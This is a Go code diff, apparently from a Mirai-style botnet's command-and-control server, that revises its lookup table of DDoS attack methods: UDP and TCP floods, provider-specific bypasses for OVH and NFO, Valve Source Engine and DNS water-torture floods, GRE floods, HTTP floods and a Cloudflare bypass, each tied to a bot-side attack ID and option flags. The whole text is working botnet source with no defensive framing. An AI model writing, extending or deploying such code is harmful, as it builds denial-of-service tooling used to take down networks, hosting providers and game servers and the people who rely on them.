@@ -62,56 +62,65 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
 	"port":     FlagInfo{7, "Destination port (alias for dport)"},
 }
 
-// Combined attack methods from all three codebases
+/*
+ * Attack method IDs - MUST MATCH bot/attack.h ATK_VEC_* values
+ * UDP Floods: 0-19
+ * TCP Floods: 20-39
+ * Special: 40-49
+ * HTTP/HTTPS: 50-59
+ * Other: 60+
+ */
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
-	// UDP attacks layer 4
-	"udp":        AttackInfo{0, []uint8{2, 3, 4, 0, 1, 5, 6, 7, 25}, "UDP flood with options"},
+	/* UDP Floods (0-19) */
+	"udp":        AttackInfo{0, []uint8{0, 1, 6, 7, 25}, "UDP flood with options"},
 	"udpplain":   AttackInfo{1, []uint8{0, 1, 7}, "UDP plain flood"},
 	"std":        AttackInfo{2, []uint8{0, 1, 7}, "STD flood"},
-	"nudp":       AttackInfo{3, []uint8{0, 6, 7}, "NUDP flood"},
-	"udphex":     AttackInfo{4, []uint8{8, 7, 20, 21, 22, 24}, "UDPHEX flood"},
-	"socket-raw": AttackInfo{5, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 29}, "Raw UDP flood"},
-	"samp":       AttackInfo{6, []uint8{0, 1, 7}, "SAMP game UDP flood"},
+	"nudp":       AttackInfo{3, []uint8{7}, "NUDP flood"},
+	"udphex":     AttackInfo{4, []uint8{0, 7}, "UDP HEX flood"},
+	"socket-raw": AttackInfo{5, []uint8{0, 2, 3, 4, 5, 6, 7, 25}, "Raw socket UDP flood"},
+	"samp":       AttackInfo{6, []uint8{7}, "SAMP game UDP flood"},
 	"udp-strong": AttackInfo{7, []uint8{0, 1, 7}, "Strong UDP flood"},
-	"hex-flood":  AttackInfo{8, []uint8{0, 1, 7}, "HEX payload flood"},
-	"strong-hex": AttackInfo{9, []uint8{0, 6, 7}, "Combined STD/HEX flood"},
+	"hex-flood":  AttackInfo{8, []uint8{0, 7}, "HEX UDP flood"},
+	"strong-hex": AttackInfo{9, []uint8{0, 7}, "Strong HEX flood"},
 	"ovhudp":     AttackInfo{10, []uint8{0, 1, 7}, "OVH UDP bypass"},
 	"cudp":       AttackInfo{11, []uint8{0, 1, 7}, "Custom UDP flood"},
 	"icee":       AttackInfo{12, []uint8{0, 1, 7}, "ICE UDP flood"},
-	"randhex":    AttackInfo{13, []uint8{0, 1, 7}, "Random HEX flood"},
-	"ovh":        AttackInfo{14, []uint8{0, 1, 7}, "OVH specific UDP"},
+	"randhex":    AttackInfo{13, []uint8{0, 7}, "Random HEX flood"},
+	"ovh":        AttackInfo{14, []uint8{0, 1, 7}, "OVH UDP flood"},
 	"ovhdrop":    AttackInfo{15, []uint8{0, 1, 7}, "OVH drop flood"},
-	"nfo":        AttackInfo{16, []uint8{0, 1, 7}, "NFO network bypass"},
+	"nfo":        AttackInfo{16, []uint8{0, 1, 7}, "NFO UDP flood"},
 
-	// TCP attacks layer 4
-	"tcp":       AttackInfo{20, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP flood"},
+	/* TCP Floods (20-39) */
+	"tcp":       AttackInfo{20, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Raw TCP flood"},
 	"syn":       AttackInfo{21, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "SYN flood"},
-	"ack":       AttackInfo{22, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "ACK flood"},
-	"stomp":     AttackInfo{23, []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16}, "TCP stomp"},
-	"hex":       AttackInfo{24, []uint8{0, 1, 7}, "HEX TCP flood"},
-	"stdhex":    AttackInfo{25, []uint8{0, 1, 7}, "STDHEX flood"},
-	"xmas":      AttackInfo{26, []uint8{0, 1, 2, 3, 4, 5, 6, 7}, "XMAS TCP flood"},
-	"tcpall":    AttackInfo{27, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "All TCP flags flood"},
-	"tcpfrag":   AttackInfo{28, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP fragment flood"},
+	"ack":       AttackInfo{22, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "ACK flood"},
+	"stomp":     AttackInfo{23, []uint8{7}, "TCP stomp"},
+	"hex":       AttackInfo{24, []uint8{0, 6, 7}, "HEX TCP flood"},
+	"stdhex":    AttackInfo{25, []uint8{0, 6, 7}, "STDHEX flood"},
+	"xmas":      AttackInfo{26, []uint8{0, 2, 3, 4, 5, 6, 7}, "XMAS TCP flood"},
+	"tcpall":    AttackInfo{27, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "All TCP flags flood"},
+	"tcpfrag":   AttackInfo{28, []uint8{0, 2, 3, 4, 5, 6, 7}, "TCP fragment flood"},
 	"asyn":      AttackInfo{29, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Async SYN flood"},
-	"usyn":      AttackInfo{30, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "USYN flood"},
-	"ackerpps":  AttackInfo{31, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "ACKER PPS flood"},
-	"tcp-mix":   AttackInfo{32, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Mixed TCP flood"},
-	"tcpbypass": AttackInfo{33, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP bypass flood"},
-	"nfolag":    AttackInfo{34, []uint8{0, 6, 7}, "NFO lag flood"},
+	"usyn":      AttackInfo{30, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "USYN flood"},
+	"ackerpps":  AttackInfo{31, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "ACKER PPS flood"},
+	"tcp-mix":   AttackInfo{32, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Mixed TCP flood"},
+	"tcpbypass": AttackInfo{33, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP bypass flood"},
+	"nflag":     AttackInfo{34, []uint8{0, 6, 7}, "No-flag TCP flood"},
 	"ovhnuke":   AttackInfo{35, []uint8{0, 6, 7}, "OVH nuke flood"},
-	"raw":       AttackInfo{36, []uint8{0, 1, 7}, "Raw TCP flood"},
+	"raw":       AttackInfo{36, []uint8{0, 6, 7}, "Raw TCP flood"},
 
-	// Special attacks
-	"vse":    AttackInfo{40, []uint8{2, 3, 4, 5, 6, 7}, "Valve Source Engine flood"},
-	"dns":    AttackInfo{41, []uint8{2, 3, 4, 5, 6, 7, 8, 9}, "DNS water torture"},
+	/* Special Attacks (40-49) */
+	"vse":    AttackInfo{40, []uint8{7}, "Valve Source Engine flood"},
+	"dns":    AttackInfo{41, []uint8{7, 8, 9}, "DNS water torture"},
 	"greip":  AttackInfo{42, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE IP flood"},
 	"greeth": AttackInfo{43, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE Ethernet flood"},
 
-	// layer 7 attacks
-	"http":  AttackInfo{50, []uint8{8, 7, 20, 21, 22, 24}, "HTTP flood"},
-	"https": AttackInfo{51, []uint8{8, 7, 20, 21, 22, 24}, "HTTPS flood"},
-	"cf": AttackInfo{60, []uint8{8, 7, 20, 21, 22, 24}, "Cloudflare bypass"},
+	/* HTTP/HTTPS (50-59) */
+	"http":  AttackInfo{50, []uint8{7, 8, 20, 21, 22, 24}, "HTTP flood"},
+	"https": AttackInfo{51, []uint8{7, 8, 20, 21, 22, 24}, "HTTPS flood"},
+
+	/* Cloudflare/Other (60+) */
+	"cf": AttackInfo{60, []uint8{7, 8, 20, 21, 22, 24}, "Cloudflare bypass"},
 }
 
 func uint8InSlice(a uint8, list []uint8) bool {
